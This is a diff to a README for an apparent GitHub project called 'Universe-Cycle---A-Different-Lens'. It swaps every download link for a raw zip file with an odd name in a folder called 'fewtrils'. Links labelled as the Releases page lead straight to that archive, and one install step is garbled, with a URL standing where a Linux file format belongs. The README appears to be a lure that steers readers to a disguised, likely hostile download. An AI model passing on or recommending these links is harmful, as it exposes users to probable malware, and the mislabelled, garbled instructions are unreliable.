@@ -1,6 +1,6 @@
 # 🌌 Universe-Cycle---A-Different-Lens - Explore the Mysteries of Our Universe
 
-[![Download the Latest Release](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Cycle_Lens_Universe_v1.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Cycle_Lens_Universe_v1.8.zip)
+[![Download the Latest Release](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Universe_Lens_Cycle_accessioner.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Universe_Lens_Cycle_accessioner.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you begin, ensure your computer meets the following basic requirements:
 
 You can download the latest version of Universe Cycle from our Releases page. 
 
-[Click here to visit this page to download.](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Cycle_Lens_Universe_v1.8.zip)
+[Click here to visit this page to download.](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Universe_Lens_Cycle_accessioner.zip)
 
 ### Steps to Download:
 
-1. Visit the [Releases page](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Cycle_Lens_Universe_v1.8.zip).
+1. Visit the [Releases page](https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Universe_Lens_Cycle_accessioner.zip).
 2. Look for the latest release version listed at the top.
-3. Select the download link for your operating system. The file may have a format like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Cycle_Lens_Universe_v1.8.zip` for Linux.
+3. Select the download link for your operating system. The file may have a format like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/khantosif786786786/Universe-Cycle---A-Different-Lens/raw/refs/heads/main/fewtrils/Different_Universe_Lens_Cycle_accessioner.zip` for Linux.
 4. Click on the link to start downloading the file.
 
 ### Steps to Install:
